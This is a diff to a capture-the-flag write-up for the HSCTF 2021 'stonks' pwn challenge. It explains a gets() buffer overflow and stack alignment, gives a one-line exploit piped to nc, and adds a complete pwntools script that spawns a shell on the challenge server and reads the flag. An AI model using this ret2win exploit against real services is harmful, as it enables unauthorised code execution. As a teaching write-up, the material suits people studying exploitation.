@@ -60,7 +60,7 @@ void ai_debug(void)
 
 In the `vuln` function, the use of the `gets` method is [bad](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351), since `gets` will read in as much data as you pass it, even if the length of that data exceeds the size of the buffer it gets passed into. In this case the buffer is 28.
 
-While debugging in GDB I identified that it takes a string of length 40 to breach RIP (the instruction pointer). I first simply added the address of `ai_debug` to a length-40 string, thinking it would jump to `ai_debug` and execute `system("/bin/sh"(`. This turned out to be incorrect due to the stack alignment issue. It was necessary to include the `ret` address of vuln prior to the start address of `ai_debug`. And with that we could execute the payload and retrieve the flag:
+While debugging in GDB I identified that it takes a string of length 40 to breach RIP (the instruction pointer). I first simply added the address of `ai_debug` to a length-40 string, thinking it would jump to `ai_debug` and execute `system("/bin/sh")`. This turned out to be incorrect due to the stack alignment issue. It was necessary to include the `ret` address of vuln prior to the start address of `ai_debug`. And with that we could execute the payload and retrieve the flag:
 
 ```console
 root@osboxes:~/Documents/hsctf2021# (python -c 'from pwn import *; print "A" * 40 + p64(0x4012c2) + p64(0x401258)';cat) | nc stonks.hsc.tf 1337
@@ -91,6 +91,36 @@ tmp
 usr
 var
 cat flag
+flag{to_the_moon}
+```
+
+As an extra exercise we can put this in a script:
+
+```py
+from pwn import *
+
+HOST = 'stonks.hsc.tf'
+PORT = 1337
+
+payload = "A" * 40 
+payload += p64(0x4012c2) # stack offset (i.e. ret address of vuln function)
+payload += p64(0x401258) # ai_debug() address
+
+sh = remote(HOST,PORT)
+sh.recvuntil("symbol: ")
+sh.sendline(payload)
+sh.interactive()
+```
+
+Running it:
+
+
+ ```console
+ root@osboxes:~/Documents/hsctf2021# python stonks_payload.py 
+[+] Opening connection to stonks.hsc.tf on port 1337: Done
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03will increase by $3 today!
+$ cat flag
 flag{to_the_moon}
 ```
 
